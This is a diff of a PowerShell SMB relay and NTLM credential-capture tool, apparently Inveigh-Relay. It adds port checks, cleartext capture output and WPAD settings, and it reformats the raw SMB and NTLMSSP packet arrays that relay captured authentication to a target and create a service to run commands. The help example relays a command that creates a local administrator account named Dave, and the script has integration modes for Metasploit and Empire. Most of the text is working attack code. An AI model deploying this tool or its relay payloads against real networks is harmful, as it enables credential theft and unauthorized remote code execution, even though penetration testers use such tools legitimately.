@@ -83,12 +83,14 @@ also be enabled.
 Default = Enabled: (Y/N) Enable/Disable the help messages at startup.
 
 .PARAMETER Tool
-Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's
-Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire  
+Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Meterpreter's
+PowerShell extension, Metasploit's Interactive PowerShell Sessions payloads and Empire.
+0 = None, 1 = Metasploit/Meterpreter, 2 = Empire 
 
 .EXAMPLE
+Invoke-Inveigh -HTTP N
 Invoke-InveighRelay -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Summer2016 /add && net localgroup administrators Dave /add"
-Execute with SMB relay enabled with a command that will create a local administrator account on the SMB relay
+Perform SMB relay with a command that will create a local administrator account on the SMB relay
 target.
 
 .LINK
@@ -162,31 +164,39 @@ if(!$inveigh)
     $inveigh.cleartext_list = New-Object System.Collections.ArrayList
     $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
     $inveigh.SMBRelay_failed_list = New-Object System.Collections.ArrayList
+    $inveigh.valid_host_list = New-Object System.Collections.ArrayList
 }
 
-if($inveigh.HTTP_listener.IsListening)
+if($inveigh.HTTP_listener.IsListening -and !$inveigh.running)
 {
     $inveigh.HTTP_listener.Stop()
     $inveigh.HTTP_listener.Close()
 }
 
-if(!$inveigh.running -or !$inveigh.running)
+if(!$inveigh.running -or !$inveigh.unprivileged_running)
 {
     $inveigh.console_queue = New-Object System.Collections.ArrayList
     $inveigh.status_queue = New-Object System.Collections.ArrayList
     $inveigh.log_file_queue = New-Object System.Collections.ArrayList
     $inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList
     $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
+    $inveigh.cleartext_file_queue = New-Object System.Collections.ArrayList
+    $inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
     $inveigh.certificate_application_ID = $HTTPSCertAppID
     $inveigh.certificate_thumbprint = $HTTPSCertThumbprint
-    $inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
     $inveigh.console_output = $false
     $inveigh.console_input = $true
     $inveigh.file_output = $false
     $inveigh.log_out_file = $output_directory + "\Inveigh-Log.txt"
     $inveigh.NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
     $inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
-    $Inveigh.challenge = $Challenge
+    $inveigh.cleartext_out_file = $output_directory + "\Inveigh-Cleartext.txt"
+    $inveigh.HTTP_response = $HTTPResponse
+    $inveigh.HTTP_directory = $HTTPDir
+    $inveigh.HTTP_default_file = $HTTPDefaultFile
+    $inveigh.HTTP_default_exe = $HTTPDefaultEXE
+    $inveigh.WPAD_response = $WPADResponse
+    $inveigh.challenge = $Challenge
 }
 
 $inveigh.relay_running = $true
@@ -211,7 +221,7 @@ else
     $inveigh.output_stream_only = $false
 }
 
-if($Tool -eq 1) # Metasploit Interactive Powershell
+if($Tool -eq 1) # Metasploit Interactive PowerShell Payloads and Meterpreter's PowerShell Extension
 {
     $inveigh.tool = 1
     $inveigh.output_stream_only = $true
@@ -246,8 +256,20 @@ if($firewall_status)
 
 if($HTTP -eq 'Y')
 {
-    $inveigh.HTTP = $true
-    $inveigh.status_queue.Add("HTTP Capture Enabled")  > $null
+
+    $HTTP_port_check = netstat -ap TCP | findstr 0.0.0.0:80
+
+    if($HTTP_port_check)
+    {
+        $inveigh.HTTP = $true
+        $inveigh.status_queue.Add("HTTP Capture Disabled Due To In Use Port 80")  > $null
+    }
+    else
+    {
+        $inveigh.HTTP = $true
+        $inveigh.status_queue.Add("HTTP Capture Enabled")  > $null
+    }
+
 }
 else
 {
@@ -257,28 +279,40 @@ else
 
 if($HTTPS -eq 'Y')
 {
+    
+    $HTTPS_port_check = netstat -ap TCP | findstr 0.0.0.0:443
 
-    try
+    if($HTTPS_port_check)
     {
-        $inveigh.HTTPS = $true
-        $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
-        $certificate_store.Open('ReadWrite')
-        $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
-        $certificate.Import($PWD.Path + "\Inveigh.pfx")
-        $certificate_store.Add($certificate) 
-        $certificate_store.Close()
-        $netsh_certhash = "certhash=" + $inveigh.certificate_thumbprint
-        $netsh_app_ID = "appid={" + $inveigh.certificate_application_ID + "}"
-        $netsh_arguments = @("http","add","sslcert","ipport=0.0.0.0:443",$netsh_certhash,$netsh_app_ID)
-        & "netsh" $netsh_arguments > $null
-        $inveigh.status_queue.Add("HTTPS Capture Enabled")  > $null
+        $inveigh.HTTP = $true
+        $inveigh.status_queue.Add("HTTPS Capture Disabled Due To In Use Port 443")  > $null
     }
-    catch
+    else
     {
-        $certificate_store.Close()
-        $HTTPS="N"
-        $inveigh.HTTPS = $false
-        $inveigh.status_queue.Add("HTTPS Capture Disabled Due To Certificate Install Error")  > $null
+
+        try
+        {
+            $inveigh.HTTPS = $true
+            $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
+            $certificate_store.Open('ReadWrite')
+            $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
+            $certificate.Import($PWD.Path + "\Inveigh.pfx")
+            $certificate_store.Add($certificate) 
+            $certificate_store.Close()
+            $netsh_certhash = "certhash=" + $inveigh.certificate_thumbprint
+            $netsh_app_ID = "appid={" + $inveigh.certificate_application_ID + "}"
+            $netsh_arguments = @("http","add","sslcert","ipport=0.0.0.0:443",$netsh_certhash,$netsh_app_ID)
+            & "netsh" $netsh_arguments > $null
+            $inveigh.status_queue.Add("HTTPS Capture Enabled")  > $null
+        }
+        catch
+        {
+            $certificate_store.Close()
+            $HTTPS="N"
+            $inveigh.HTTPS = $false
+            $inveigh.status_queue.Add("HTTPS Capture Disabled Due To Certificate Install Error")  > $null
+        }
+
     }
 
 }
@@ -287,23 +321,28 @@ else
     $inveigh.status_queue.Add("HTTPS Capture Disabled")  > $null
 }
 
-if($Challenge)
+if($inveigh.HTTP -or $inveigh.HTTPS)
 {
-    $Inveigh.challenge = $challenge
-    $inveigh.status_queue.Add("NTLM Challenge = $Challenge")  > $null
-}
 
-if($MachineAccounts -eq 'N')
-{
-    $inveigh.status_queue.Add("Ignoring Machine Accounts") > $null
-    $inveigh.machine_accounts = $false
-}
-else
-{
-    $inveigh.machine_accounts = $true
-}
+    if($Challenge)
+    {
+        $Inveigh.challenge = $challenge
+        $inveigh.status_queue.Add("NTLM Challenge = $Challenge")  > $null
+    }
 
-$inveigh.status_queue.Add("Force WPAD Authentication = $WPADAuth") > $null
+    if($MachineAccounts -eq 'N')
+    {
+        $inveigh.status_queue.Add("Machine Account Capture = Disabled") > $null
+        $inveigh.machine_accounts = $false
+    }
+    else
+    {
+        $inveigh.machine_accounts = $true
+    }
+
+    $inveigh.status_queue.Add("WPAD Authentication = $WPADAuth") > $null
+
+}
 
 if($ConsoleOutput -eq 'Y')
 {
@@ -389,7 +428,7 @@ if($SMBRelayNetworkTimeout)
 if($ShowHelp -eq 'Y')
 {
     $inveigh.status_queue.Add("Use Get-Command -Noun Inveigh* to show available functions") > $null
-    $inveigh.status_queue.Add("Run Stop-Inveigh to stop Inveigh") > $null
+    $inveigh.status_queue.Add("Run Stop-Inveigh to stop Inveigh-Relay") > $null
         
     if($inveigh.console_output)
     {
@@ -407,7 +446,7 @@ if($inveigh.status_output)
         if($inveigh.output_stream_only)
         {
             Write-Output($inveigh.status_queue[0] + $inveigh.newline)
-            $inveigh.status_queue.RemoveRange(0,1)
+            $inveigh.status_queue.RemoveAt(0)
         }
         else
         {
@@ -415,22 +454,28 @@ if($inveigh.status_output)
             switch ($inveigh.status_queue[0])
             {
 
+                "* Disabled Due To *"
+                {
+                    Write-Warning($inveigh.status_queue[0])
+                    $inveigh.status_queue.RemoveAt(0)
+                }
+                
                 "Run Stop-Inveigh to stop Inveigh"
                 {
                     Write-Warning($inveigh.status_queue[0])
-                    $inveigh.status_queue.RemoveRange(0,1)
+                    $inveigh.status_queue.RemoveAt(0)
                 }
 
                 "Windows Firewall = Enabled"
                 {
                     Write-Warning($inveigh.status_queue[0])
-                    $inveigh.status_queue.RemoveRange(0,1)
+                    $inveigh.status_queue.RemoveAt(0)
                 }
 
                 default
                 {
                     Write-Output($inveigh.status_queue[0])
-                    $inveigh.status_queue.RemoveRange(0,1)
+                    $inveigh.status_queue.RemoveAt(0)
                 }
 
             }
@@ -444,7 +489,7 @@ if($inveigh.status_output)
 $process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
 $process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
 $process_ID = $process_ID -replace "-00-00",""
-[Byte[]] $inveigh.process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+[Byte[]]$inveigh.process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
 
 # Begin ScriptBlocks
 
@@ -653,26 +698,26 @@ $SMB_relay_response_scriptblock =
         :SMB_relay_response_loop while ($j -lt 1)
         {
             $SMB_relay_response_send = 0x00,0x00 +
-                                       $SMB_netbios_length +
-                                       0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x01,0x48,0x00,0x00,0x00,
-                                       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff +
-                                       $inveigh.process_ID_bytes +
-                                       $SMB_user_ID +
-                                       0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,0x01,0x00,0x00,0x00,
-                                       0x00,0x00 +
-                                       $SMB_blob_length +
-                                       0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80 +
-                                       $SMB_byte_count +
-                                       0xa1,0x82 +
-                                       $SMB_length_1 +
-                                       0x30,0x82 +
-                                       $SMB_length_2 +
-                                       0xa2,0x82 +
-                                       $SMB_length_3 +
-                                       0x04,0x82 +
-                                       $SMB_NTLMSSP_length +
-                                       $HTTP_request_bytes +
-                                       0x55,0x6e,0x69,0x78,0x00,0x53,0x61,0x6d,0x62,0x61,0x00
+                                        $SMB_netbios_length +
+                                        0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x01,0x48,0x00,0x00,0x00,
+                                        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff +
+                                        $inveigh.process_ID_bytes +
+                                        $SMB_user_ID +
+                                        0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,0x01,0x00,0x00,0x00,
+                                        0x00,0x00 +
+                                        $SMB_blob_length +
+                                        0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80 +
+                                        $SMB_byte_count +
+                                        0xa1,0x82 +
+                                        $SMB_length_1 +
+                                        0x30,0x82 +
+                                        $SMB_length_2 +
+                                        0xa2,0x82 +
+                                        $SMB_length_3 +
+                                        0x04,0x82 +
+                                        $SMB_NTLMSSP_length +
+                                        $HTTP_request_bytes +
+                                        0x55,0x6e,0x69,0x78,0x00,0x53,0x61,0x6d,0x62,0x61,0x00
 
             $SMB_relay_response_stream.Write($SMB_relay_response_send,0,$SMB_relay_response_send.Length)
         	$SMB_relay_response_stream.Flush()
@@ -760,45 +805,45 @@ $SMB_relay_execute_scriptblock =
                 0
                 {
                     $SMB_relay_execute_send = 0x00,0x00,0x00,0x45,0xff,0x53,0x4d,0x42,0x75,0x00,0x00,0x00,0x00,
-                                              0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-                                              0x00,0x00,0xff,0xff +
-                                              $inveigh.process_ID_bytes +
-                                              $SMB_user_ID +
-                                              0x00,0x00,0x04,0xff,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x1a,0x00,
-                                              0x00,0x5c,0x5c,0x31,0x30,0x2e,0x31,0x30,0x2e,0x32,0x2e,0x31,0x30,
-                                              0x32,0x5c,0x49,0x50,0x43,0x24,0x00,0x3f,0x3f,0x3f,0x3f,0x3f,0x00
+                                                0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+                                                0x00,0x00,0xff,0xff +
+                                                $inveigh.process_ID_bytes +
+                                                $SMB_user_ID +
+                                                0x00,0x00,0x04,0xff,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x1a,0x00,
+                                                0x00,0x5c,0x5c,0x31,0x30,0x2e,0x31,0x30,0x2e,0x32,0x2e,0x31,0x30,
+                                                0x32,0x5c,0x49,0x50,0x43,0x24,0x00,0x3f,0x3f,0x3f,0x3f,0x3f,0x00
                 }
                   
                 1
                 {
                     $SMB_relay_execute_send = 0x00,0x00,0x00,0x5b,0xff,0x53,0x4d,0x42,0xa2,0x00,0x00,0x00,0x00,
-                                              0x18,0x02,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-                                              0x00,0x00,0x00,0x08 +
-                                              $inveigh.process_ID_bytes +
-                                              $SMB_user_ID +
-                                              0x03,0x00,0x18,0xff,0x00,0x00,0x00,0x00,0x07,0x00,0x16,0x00,0x00,
-                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,
-                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x01,
-                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x08,
-                                              0x00,0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00
+                                                0x18,0x02,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+                                                0x00,0x00,0x00,0x08 +
+                                                $inveigh.process_ID_bytes +
+                                                $SMB_user_ID +
+                                                0x03,0x00,0x18,0xff,0x00,0x00,0x00,0x00,0x07,0x00,0x16,0x00,0x00,
+                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,
+                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x01,
+                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x08,
+                                                0x00,0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00
                 }
                 
                 2
                 {
                     $SMB_relay_execute_send = 0x00,0x00,0x00,0x87,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
-                                              0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-                                              0x00,0x00,0x00,0x08 +
-                                              $inveigh.process_ID_bytes +
-                                              $SMB_user_ID +
-                                              0x04,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,
-                                              0xff,0xff,0xff,0xff,0x08,0x00,0x48,0x00,0x00,0x00,0x48,0x00,0x3f,
-                                              0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x05,0x00,0x0b,0x03,0x10,0x00,
-                                              0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xd0,0x16,0xd0,
-                                              0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
-                                              0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,
-                                              0x00,0x10,0x03,0x02,0x00,0x00,0x00,0x04,0x5d,0x88,0x8a,0xeb,0x1c,
-                                              0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,0x02,0x00,0x00,
-                                              0x00
+                                                0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+                                                0x00,0x00,0x00,0x08 +
+                                                $inveigh.process_ID_bytes +
+                                                $SMB_user_ID +
+                                                0x04,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,
+                                                0xff,0xff,0xff,0xff,0x08,0x00,0x48,0x00,0x00,0x00,0x48,0x00,0x3f,
+                                                0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x05,0x00,0x0b,0x03,0x10,0x00,
+                                                0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xd0,0x16,0xd0,
+                                                0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
+                                                0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,
+                                                0x00,0x10,0x03,0x02,0x00,0x00,0x00,0x04,0x5d,0x88,0x8a,0xeb,0x1c,
+                                                0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,0x02,0x00,0x00,
+                                                0x00
                         
                     $SMB_multiplex_id = 0x05
                 }
@@ -811,18 +856,18 @@ $SMB_relay_execute_scriptblock =
                 4
                 {
                     $SMB_relay_execute_send = 0x00,0x00,0x00,0x9b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
-                                              0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-                                              0x00,0x00,0x00,0x08 +
-                                              $inveigh.process_ID_bytes +
-                                              $SMB_user_ID +
-                                              0x06,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,
-                                              0xff,0xff,0xff,0xff,0x08,0x00,0x50,0x00,0x00,0x00,0x5c,0x00,0x3f,
-                                              0x00,0x00,0x00,0x00,0x00,0x5c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
-                                              0x00,0x00,0x5c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x38,0x00,0x00,
-                                              0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x03,0x00,0x15,0x00,0x00,0x00,
-                                              0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
-                                              $SMB_service_bytes +
-                                              0x00,0x00,0x00,0x00,0x00,0x00,0x3f,0x00,0x0f,0x00
+                                                0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+                                                0x00,0x00,0x00,0x08 +
+                                                $inveigh.process_ID_bytes +
+                                                $SMB_user_ID +
+                                                0x06,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,
+                                                0xff,0xff,0xff,0xff,0x08,0x00,0x50,0x00,0x00,0x00,0x5c,0x00,0x3f,
+                                                0x00,0x00,0x00,0x00,0x00,0x5c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
+                                                0x00,0x00,0x5c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x38,0x00,0x00,
+                                                0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x03,0x00,0x15,0x00,0x00,0x00,
+                                                0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
+                                                $SMB_service_bytes +
+                                                0x00,0x00,0x00,0x00,0x00,0x00,0x3f,0x00,0x0f,0x00
                         
                     $SMB_multiplex_id = 0x07
                 }
@@ -834,39 +879,39 @@ $SMB_relay_execute_scriptblock =
                 
                 6
                 {
-                    $SMB_relay_execute_send = [Array] 0x00 +
-                                              $SMB_service_data_length_bytes +
-                                              0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28,0x00,
-                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08 +
-                                              $inveigh.process_ID_bytes +
-                                              $SMB_user_ID +
-                                              0x08,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,
-                                              0xff,0xff,0xff,0xff,0x08,0x00 +
-                                              $SMB_service_byte_count_bytes +
-                                              0x00,0x00 +
-                                              $SMB_service_byte_count_bytes +
-                                              0x3f,0x00,0x00,0x00,0x00,0x00 +
-                                              $SMB_service_byte_count_bytes +
-                                              0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00 +
-                                              $SMB_service_byte_count_bytes +
-                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,
-                                              0x00 +
-                                              $SMB_context_handler +
-                                              0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
-                                              $SMB_service_bytes +
-                                              0x00,0x00 +
-                                              $SMB_referent_ID_bytes +
-                                              0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
-                                              $SMB_service_bytes +
-                                              0x00,0x00,0xff,0x01,0x0f,0x00,0x10,0x01,0x00,0x00,0x03,0x00,0x00,
-                                              0x00,0x00,0x00,0x00,0x00 +
-                                              $SMB_relay_command_length_bytes +
-                                              0x00,0x00,0x00,0x00 +
-                                              $SMB_relay_command_length_bytes +
-                                              $SMB_relay_command_bytes +
-                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-                                              0x00,0x00
+                    $SMB_relay_execute_send = [Array]0x00 +
+                                                $SMB_service_data_length_bytes +
+                                                0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28,0x00,
+                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08 +
+                                                $inveigh.process_ID_bytes +
+                                                $SMB_user_ID +
+                                                0x08,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,
+                                                0xff,0xff,0xff,0xff,0x08,0x00 +
+                                                $SMB_service_byte_count_bytes +
+                                                0x00,0x00 +
+                                                $SMB_service_byte_count_bytes +
+                                                0x3f,0x00,0x00,0x00,0x00,0x00 +
+                                                $SMB_service_byte_count_bytes +
+                                                0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00 +
+                                                $SMB_service_byte_count_bytes +
+                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,
+                                                0x00 +
+                                                $SMB_context_handler +
+                                                0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
+                                                $SMB_service_bytes +
+                                                0x00,0x00 +
+                                                $SMB_referent_ID_bytes +
+                                                0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
+                                                $SMB_service_bytes +
+                                                0x00,0x00,0xff,0x01,0x0f,0x00,0x10,0x01,0x00,0x00,0x03,0x00,0x00,
+                                                0x00,0x00,0x00,0x00,0x00 +
+                                                $SMB_relay_command_length_bytes +
+                                                0x00,0x00,0x00,0x00 +
+                                                $SMB_relay_command_length_bytes +
+                                                $SMB_relay_command_bytes +
+                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+                                                0x00,0x00
                         
                     $SMB_multiplex_id = 0x09
                 }
@@ -880,17 +925,17 @@ $SMB_relay_execute_scriptblock =
                 8
                 {
                     $SMB_relay_execute_send = 0x00,0x00,0x00,0x73,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
-                                              0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-                                              0x00,0x00,0x00,0x08 +
-                                              $inveigh.process_ID_bytes +
-                                              $SMB_user_ID +
-                                              0x0a,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,
-                                              0xff,0xff,0xff,0xff,0x08,0x00,0x34,0x00,0x00,0x00,0x34,0x00,0x3f,
-                                              0x00,0x00,0x00,0x00,0x00,0x34,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
-                                              0x00,0x00,0x34,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,
-                                              0x00,0x00,0x00,0x13,0x00 +
-                                              $SMB_context_handler +
-                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+                                                0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+                                                0x00,0x00,0x00,0x08 +
+                                                $inveigh.process_ID_bytes +
+                                                $SMB_user_ID +
+                                                0x0a,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,
+                                                0xff,0xff,0xff,0xff,0x08,0x00,0x34,0x00,0x00,0x00,0x34,0x00,0x3f,
+                                                0x00,0x00,0x00,0x00,0x00,0x34,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
+                                                0x00,0x00,0x34,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,
+                                                0x00,0x00,0x00,0x13,0x00 +
+                                                $SMB_context_handler +
+                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                 }
                 
                 9
@@ -901,16 +946,16 @@ $SMB_relay_execute_scriptblock =
                 10
                 { 
                      $SMB_relay_execute_send = 0x00,0x00,0x00,0x6b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
-                                               0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-                                               0x00,0x00,0x00,0x08 +
-                                               $inveigh.process_ID_bytes +
-                                               $SMB_user_ID +
-                                               0x0b,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x0b,0x01,0x00,0x00,
-                                               0xff,0xff,0xff,0xff,0x08,0x00,0x2c,0x00,0x00,0x00,0x2c,0x00,0x3f,
-                                               0x00,0x00,0x00,0x00,0x00,0x2c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
-                                               0x00,0x00,0x2c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0x00,0x00,
-                                               0x00,0x00,0x00,0x02,0x00 +
-                                               $SMB_context_handler
+                                                0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+                                                0x00,0x00,0x00,0x08 +
+                                                $inveigh.process_ID_bytes +
+                                                $SMB_user_ID +
+                                                0x0b,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x0b,0x01,0x00,0x00,
+                                                0xff,0xff,0xff,0xff,0x08,0x00,0x2c,0x00,0x00,0x00,0x2c,0x00,0x3f,
+                                                0x00,0x00,0x00,0x00,0x00,0x2c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
+                                                0x00,0x00,0x2c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0x00,0x00,
+                                                0x00,0x00,0x00,0x02,0x00 +
+                                                $SMB_context_handler
                 }
 
                 11
@@ -1087,19 +1132,19 @@ $HTTP_scriptblock =
         $inveigh.HTTP_challenge_queue.Add($inveigh.request.RemoteEndpoint.Address.IPAddressToString + $inveigh.request.RemoteEndpoint.Port + ',' + $HTTP_challenge)  > $null
 
         $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,
-                           0x00,0x00,0x00,0x05,0x82,0x89,0xa2 +
-                           $HTTP_challenge_bytes +
-                           0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,
-                           0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00,0x02,0x00,0x06,0x00,
-                           0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,
-                           0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00,0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,
-                           0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,
-                           0x00,0x68,0x00,0x6f,0x00,0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,
-                           0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,
-                           0x00,0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,
-                           0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00 +
-                           $HTTP_timestamp +
-                           0x00,0x00,0x00,0x00,0x0a,0x0a
+                            0x00,0x00,0x00,0x05,0x82,0x89,0xa2 +
+                            $HTTP_challenge_bytes +
+                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,
+                            0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00,0x02,0x00,0x06,0x00,
+                            0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,
